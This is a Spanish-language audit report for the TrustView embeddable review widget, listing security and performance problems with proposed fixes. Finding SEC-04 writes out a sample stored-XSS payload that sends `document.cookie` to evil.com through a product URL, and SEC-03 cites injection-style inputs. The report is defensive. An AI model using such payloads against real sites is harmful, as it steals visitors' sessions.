# TrustView Widget — Problemas Identificados y Soluciones Propuestas

> Fecha de auditoria: 2026-04-05  
> Alcance: Seguridad, optimizacion, rendimiento del widget embebible

---

## Resumen Ejecutivo

| Severidad | Seguridad | Optimizacion | Total |
|-----------|-----------|--------------|-------|
| Alta      | 5         | 2            | **7** |
| Media     | 4         | 6            | **10**|
| Baja      | 2         | 2            | **4** |
| **Total** | **11**    | **10**       | **21**|

---

## Seguridad

### SEC-01 — CORS `origin: true` en el backend acepta cualquier origen [ALTA]

**Problema**: El backend Express esta configurado con `origin: true`, aceptando requests de cualquier sitio web. Los endpoints `/widget/*` son llamados por el widget desde tiendas TiendaNube, pero cualquier pagina puede hacer las mismas llamadas.

**Solucion**: Reemplazar con allowlist explicita de dominios TiendaNube (`.tiendanube.com`, `.mitiendanube.com`), el CDN del widget (`trust-view-widget.vercel.app`) y el panel admin. Si los endpoints de widget deben ser publicos, documentar la decision explicitamente.

**Archivos afectados**: `TrustView-Core/src/app.js`

---

### SEC-02 — Sin rate limiting en `/widget/newReview` [ALTA]

**Problema**: El endpoint de creacion de reviews no tiene ningun control de velocidad. No hay `express-rate-limit` ni anti-spam. Combinado con CORS abierto, cualquiera puede enviar miles de reviews falsas por segundo a cualquier tienda.

**Solucion**: Agregar `express-rate-limit` especificamente a `/widget/newReview`. Limite conservador: 5-10 requests por IP cada 15 minutos. Adicionalmente, considerar limite por store_id (max 100 reviews/tienda/dia). Opcionalmente agregar honeypot field al formulario.

**Archivos afectados**: `TrustView-Core/src/routes/widgetRoutes.js`

---

### SEC-03 — Sin middleware de validacion en rutas del widget [ALTA]

**Problema**: El proyecto tiene un middleware `validate()` basado en Zod y un `createReviewSchema`, pero `validateMiddleware.js` esta completamente vacio y ninguna ruta de widget lo usa. El controlador `newReview` lee `req.body` crudo sin validacion. Payloads malformados (`rating: "DROP TABLE"`, `product_url: "javascript:..."`) llegan directamente a la base de datos.

**Solucion**: Implementar el middleware `validate()` con schema Zod dedicado para widget-review. Aplicar a `router.post("/newReview", validate(widgetReviewSchema), newReview)`. El schema debe validar: `store_external_id` string no vacio, `rating` integer 1-5, `author_name` max 100 chars, `content` max 500 chars opcional, `product_url` solo HTTP/HTTPS.

**Archivos afectados**: `TrustView-Core/src/routes/widgetRoutes.js`, `TrustView-Core/src/middlewares/validateMiddleware.js`

---

### SEC-04 — XSS via `productUrl` en `<a href>` sin sanitizacion de protocolo [ALTA]

**Problema**: `ReviewCard` renderiza `review.productUrl` directamente en un `<a href>`. Si un atacante envía una review con `product_url: "javascript:fetch('https://evil.com?c='+document.cookie)"`, esto se almacena en la DB y se sirve a cada visitante de la tienda.

**Solucion**: En backend: validar `product_url` en el schema para aceptar solo `http://` y `https://`. En frontend: crear utilidad `sanitizeUrl()` que retorne `"#"` para cualquier URL que no sea http/https. Aplicar ambas capas (defensa en profundidad).

**Archivos afectados**: `src/widgets/components/ReviewCard/index.tsx`, `TrustView-Core/src/services/widgetService.js`

---

### SEC-05 — Inconsistencia de tipo `storeId`: `number` vs `string` [ALTA]

**Problema**: `main.tsx` declara `storeId: number`. TiendaNube expone `window.LS.store.id` como number. Pero todos los hooks y servicios tipan `storeId` como `string`. El guard `enabled: !!storeId` evalua `false` cuando `storeId === 0`. Ademas, query keys como `["productRating", 12345, "678"]` vs `["productRating", "12345", "678"]` son cache keys diferentes, causando requests duplicados.

**Solucion**: Estandarizar en `storeId: string` en todo el codigo. En `main.tsx` coercionar: `storeId: String(window.LS.store.id)`. Actualizar tipos en `types.d.ts`. Cambiar guard a `storeId !== ""`.

**Archivos afectados**: `src/main.tsx`, `src/hooks/widgets/*.ts`, `src/services/widgets/types.d.ts`, `docs/test.js`

---

### SEC-06 — Shadow DOM `mode: "open"` permite acceso desde scripts del tema [MEDIA]

**Problema**: Shadow DOM se crea con `{ mode: "open" }`, permitiendo que cualquier JavaScript del tema de TiendaNube acceda a `hostElement.shadowRoot` y lea o mute el DOM del widget, incluyendo valores del formulario de reviews.

**Solucion**: Evaluar cambiar a `{ mode: "closed" }` para produccion. El tradeoff es que DevTools y algunos polyfills no funcionan con closed roots. Usar `mode: "open"` solo en desarrollo.

**Archivos afectados**: `src/main.tsx`

---

### SEC-07 — Sin SRI (Subresource Integrity) en carga del bundle [MEDIA]

**Problema**: El loader inyecta el bundle sin hash de integridad. Si el deploy de Vercel es comprometido (supply chain attack), JavaScript malicioso se cargaria en cada tienda silenciosamente.

**Solucion**: Generar hash SHA-384 del bundle en CI. Embeber en el loader como `script.integrity`. Alternativamente, versionar la URL del bundle (e.g. `trustview-widget.v1.2.3.bundle.js`) para que las tiendas fijen una version.

**Archivos afectados**: `docs/test.js`

---

### SEC-08 — `window.Trustview` global ejecutable por cualquier script [MEDIA]

**Problema**: Cualquier script en la tienda (analytics, marketing de terceros) puede llamar `window.Trustview.mountGridReviews()` con `storeId` arbitrarios, montar widgets en ubicaciones inesperadas o generar requests extra.

**Solucion**: Agregar guard dentro de cada funcion `mount*` que valide `storeId` contra `window.LS.store.id`. Logear intentos de mount inesperados. Considerar `Object.freeze(window.Trustview)`.

**Archivos afectados**: `src/main.tsx`

---

### SEC-09 — Vulnerabilidades npm: 4 High + 1 Moderate en dependencias de build [MEDIA]

**Problema**: `npm audit` reporta vulnerabilidades en rollup (path traversal), minimatch (ReDoS), picomatch (ReDoS), flatted (prototype pollution) y brace-expansion (memory exhaustion). Son dependencias de build, no runtime, pero rollup podria ser explotado en CI comprometido.

**Solucion**: Ejecutar `npm audit fix`. Agregar `npm audit --audit-level=high` al workflow de CI para bloquear merges.

**Archivos afectados**: `package.json`

---

### SEC-10 — Version leak en `console.log` del loader [BAJA]

**Problema**: `console.log("Trustview loader iniciado v.2.3")` revela la version exacta en la consola de cada tienda. Atacantes pueden apuntar a versiones con vulnerabilidades conocidas.

**Solucion**: Remover o degradar a `console.debug`. Si se necesita tracking, emitir a endpoint de telemetria.

**Archivos afectados**: `docs/test.js`

---

### SEC-11 — Links sin `rel="noopener noreferrer"` [BAJA]

**Problema**: Links de producto en `ReviewCard` no incluyen `rel="noopener noreferrer"`, exponiendo la referencia de la ventana opener y el referer.

**Solucion**: Agregar `target="_blank" rel="noopener noreferrer"` a todos los `<a>` con URLs externas.

**Archivos afectados**: `src/widgets/components/ReviewCard/index.tsx`

---

## Optimizacion

### OPT-01 — `moment.js` en el bundle IIFE (+~70KB gzip) [ALTA]

**Problema**: `moment.js` + locale español agrega ~70KB gzip (230KB raw) al bundle. Se usa para una sola funcion de formateo de fechas. Para un widget embebible que debe ser liviano y no-bloqueante, esto es el mayor cuello de botella de tamanio.

**Solucion**: Reemplazar con `date-fns` (tree-shakeable, ~3-5KB para las funciones usadas) o `Intl.RelativeTimeFormat` + `Intl.DateTimeFormat` nativo del browser (0KB). Remover `moment` de dependencies.

**Archivos afectados**: `src/utils/formatDate.ts`, `package.json`

---

### OPT-02 — `MutationObserver` nunca desconectado (memory leak) [ALTA]

**Problema**: El loader crea un `MutationObserver` en `document.body` con `{ childList: true, subtree: true }` que nunca llama `observer.disconnect()`. Se dispara en CADA mutacion del DOM de la pagina — animaciones, carrito, lazy-load, scroll — durante toda la vida de la pagina. El callback `mountListing` itera todos los nodos de producto repetidamente.

**Solucion**: (1) Agregar debounce de 200ms a `mountListing`. (2) Narrowear el target del observer al container de productos (`.js-product-list`) si existe. (3) Desconectar el observer cuando no encuentra items nuevos por N callbacks consecutivos.

**Archivos afectados**: `docs/test.js`

---

### OPT-03 — `QueryClient` singleton sin `gcTime` configurado [MEDIA]

**Problema**: `staleTime: 5m` configurado pero `gcTime` (ex `cacheTime`) usa el default de 5 minutos. En paginas con 50 product cards (`mountProductRatingCard` x 50), hay 50 entradas de cache en memoria.

**Solucion**: Configurar `gcTime: 2 minutos` explicito. Para paginas de alta densidad, considerar un `QueryClient` por mount en vez del singleton global.

**Archivos afectados**: `src/services/queryClient.ts`

---

### OPT-04 — `staleTime` duplicado en config global Y en cada hook [MEDIA]

**Problema**: `staleTime` y `refetchOnWindowFocus` estan en el `QueryClient` default Y en cada hook individual. Los overrides por hook hacen que la config global sea dead code.

**Solucion**: Remover duplicados de los hooks. Dejar el `QueryClient` como unica fuente de verdad.

**Archivos afectados**: `src/services/queryClient.ts`, todos los hooks en `src/hooks/widgets/`

---

### OPT-05 — Sin paginacion en `getProductReviews` [MEDIA]

**Problema**: El servicio fetchea TODAS las reviews aprobadas de un producto sin `.limit()`. Un producto popular con 500+ reviews las carga todas en cada page load. `GridReviews.tsx` las renderiza sin virtualizacion.

**Solucion**: Agregar `.limit(12)` en el backend. Implementar "cargar mas" con `useInfiniteQuery` en el frontend. 12 items iniciales = 4 filas en grid de 3 columnas.

**Archivos afectados**: `TrustView-Core/src/services/widgetService.js`, `src/services/widgets/getProductReviews.ts`, `src/widgets/GridReviews.tsx`

---

### OPT-06 — `react-hook-form` en el IIFE para formulario raramente usado [MEDIA]

**Problema**: `react-hook-form` (~25KB gzip) esta en el bundle para un modal que solo se renderiza cuando el usuario hace clic en "Deja una resenia". El overhead se paga en cada page load sin importar si el usuario abre el modal.

**Solucion**: Reemplazar con formulario controlado simple usando `useState` — el form tiene solo 3 campos (`rating`, `name`, `review`). Esto elimina la dependencia y reduce ~25KB.

**Archivos afectados**: `src/widgets/components/CreateReview/ReviewModal/index.tsx`, `package.json`

---

### OPT-07 — CSS completo de Tailwind inyectado en cada Shadow Root [MEDIA]

**Problema**: Si el widget se monta 50 veces en una pagina de listado, el mismo `<style>` con todo el CSS se inyecta 50 veces en 50 Shadow Roots diferentes.

**Solucion**: Usar `CSSStyleSheet` adoption: crear un `CSSStyleSheet` unico desde el CSS inlineado y compartirlo via `shadowRoot.adoptedStyleSheets = [sharedSheet]`. Reduce 50 copias a 1 referencia compartida. Soportado en Chromium 73+ y Firefox 101+.

**Archivos afectados**: `src/styles/index.css`, `src/main.tsx`

---

### OPT-08 — `position: fixed` en Shadow DOM puede romperse con temas que usan `transform` [MEDIA]

**Problema**: `ReviewModal` usa `className="fixed inset-0"`. CSS `position: fixed` es relativo al containing block — si algun ancestro en el tema de TiendaNube tiene `transform`, `filter` o `will-change`, el fixed positioning se rompe y el modal no cubre todo el viewport.

**Solucion**: Portalizar el modal directamente a `document.body` (perdiendo encapsulacion Shadow DOM solo para el modal), o crear un container full-screen como hijo directo de `document.body` con su propio Shadow Root.

**Archivos afectados**: `src/widgets/components/CreateReview/ReviewModal/index.tsx`

---

### OPT-09 — Clases CSS `animate-fade-in` y `animate-scale-in` no definidas [BAJA]

**Problema**: El modal usa clases de animacion que no estan definidas en ningun stylesheet del widget. El modal renderiza sin animacion, silenciosamente.

**Solucion**: Definir `@keyframes fadeIn` y `@keyframes scaleIn` en `index.css` con las clases de utilidad correspondientes.

**Archivos afectados**: `src/widgets/components/CreateReview/ReviewModal/index.tsx`, `src/styles/index.css`

---

### OPT-10 — `src/app/index.tsx` es scaffold de Vite sobrante (dead code) [BAJA]

**Problema**: Componente counter default de Vite. Importa assets que no existen. No es usado por ningun codigo de produccion.

**Solucion**: Eliminar `src/app/index.tsx` y `src/styles/App.css`.

**Archivos afectados**: `src/app/index.tsx`, `src/styles/App.css`

---

## Orden de Prioridad Recomendado

### Hacer YA (antes del proximo deploy a tiendas)
1. **SEC-02** — Rate limiting en `newReview` (prevenir spam de reviews)
2. **SEC-03** — Validacion Zod en rutas del widget
3. **SEC-04** — Sanitizar `productUrl` (XSS en tiendas de clientes)
4. **OPT-01** — Reemplazar `moment.js` (reducir bundle 70KB)
5. **OPT-02** — Debounce + disconnect del MutationObserver

### Hacer en el proximo sprint
6. **SEC-01** — Restringir CORS a dominios TiendaNube
7. **SEC-05** — Normalizar `storeId` a string
8. **OPT-05** — Paginacion en reviews de producto
9. **OPT-07** — adoptedStyleSheets para CSS compartido

### Deuda tecnica (baja urgencia)
10. **SEC-06** — Evaluar `mode: "closed"` para Shadow DOM
11. **SEC-07** — SRI en el loader
12. **OPT-03/04** — Limpiar config duplicada de QueryClient
13. **OPT-09/10** — Definir animaciones, remover dead code
